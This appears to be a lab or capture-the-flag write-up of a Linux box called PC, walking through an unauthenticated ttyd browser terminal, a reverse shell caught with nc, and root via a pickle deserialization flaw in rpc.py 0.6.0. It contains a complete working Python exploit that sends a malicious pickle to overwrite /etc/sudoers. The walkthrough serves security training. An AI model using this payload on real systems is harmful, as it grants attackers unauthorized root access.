#Linux #ttyd #WebTerminal #rpc.py #PickleDeserialization #RCE #SudoersOverwrite

## Overview

PC is a Linux box where the entire attack surface is a browser-based terminal exposed on port 8000 via `ttyd`. That terminal runs as a low-privilege user, but a locally-bound Python RPC service (`rpc.py`) accepts pickle-deserialized data, a class of vulnerability that gives arbitrary code execution. Exploiting it rewrites `/etc/sudoers` and grants unrestricted root access in one step.

## Recon

### Port Scan

```sh
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
8000/tcp open  http-alt ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|_http-title: ttyd - Terminal
```

> **What ttyd is:** `ttyd` is a tool that wraps a shell, or any process, in a WebSocket-backed terminal accessible from a browser. Port 8000 here literally hands you a running shell session in the browser, no authentication. The catch is it runs as an unprivileged user.

## Foothold

### Shell via ttyd Web Console

Port 8000 presents a fully interactive browser terminal. The installed `nc` lacks the `-e` flag, so a standard one-liner reverse shell won't work directly. Instead, a static `nc` binary was transferred from Kali and used to catch a shell over port 443:

```sh
rlwrap nc -lvnp 443
connect to [192.168.45.244] from (UNKNOWN) [192.168.183.210] 42652
whoami
user
```

TTY upgrade:

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation

### rpc.py Pickle Deserialization RCE

LinPEAS finds a Python RPC service:

```
/opt/rpc.py
```

It is bound to `127.0.0.1:65432` internally. The version is `rpc.py 0.6.0`, which has a public exploit on ExploitDB:

**rpc.py 0.6.0 - Remote Code Execution (RCE)**
https://www.exploit-db.com/exploits/50983

> **Why pickle deserialization is so dangerous:** Python's `pickle` module serializes arbitrary objects, and deserializing a payload executes whatever the object's `__reduce__` method returns. If a server accepts pickle-serialized HTTP bodies without validating them, any client can send an object that runs `os.system("...")` on the server side. There is no safe way to deserialize untrusted pickle data.

The exploit code was adjusted to work with Python 3. The payload overwrites `/etc/sudoers` to grant the `user` account unrestricted root access:

```python
import requests
import pickle

HOST = "127.0.0.1:65432"
URL = f"http://{HOST}/sayhi"
HEADERS = {"serializer": "pickle"}

def generate_payload(cmd):
    class PickleRce(object):
        def __reduce__(self):
            import os
            return os.system, (cmd,)
    return pickle.dumps(PickleRce())

def exec_command(cmd):
    payload = generate_payload(cmd)
    requests.post(url=URL, data=payload, headers=HEADERS)

def main():
    exec_command('echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers')

if __name__ == "__main__":
    main()
```

Running it from the target (since the service is localhost-only):

```sh
user@pc:/tmp$ python3 test.py
b'\x80\x04\x95N\x00\x00\x00...'
```

## Root

```sh
user@pc:/tmp$ sudo /bin/bash
root@pc:/tmp# whoami
root
```

```sh
root@pc:~# cat proof.txt
‹redacted›
```

## Takeaways

- **Unauthenticated ttyd is a shell.** No exploit needed, the foothold was browsing to port 8000 and running commands in a browser tab.
- **Localhost services are still in scope.** Once inside as any user, locally-bound services become reachable. Always check what's listening internally with `ss -tlnp` or what LinPEAS surfaces.
- **Pickle deserialization = RCE, always.** Any service that deserializes pickle data from user-controlled input can be turned into arbitrary code execution with a 5-line Python payload. The `serializer: pickle` header in this service was the only signal needed.
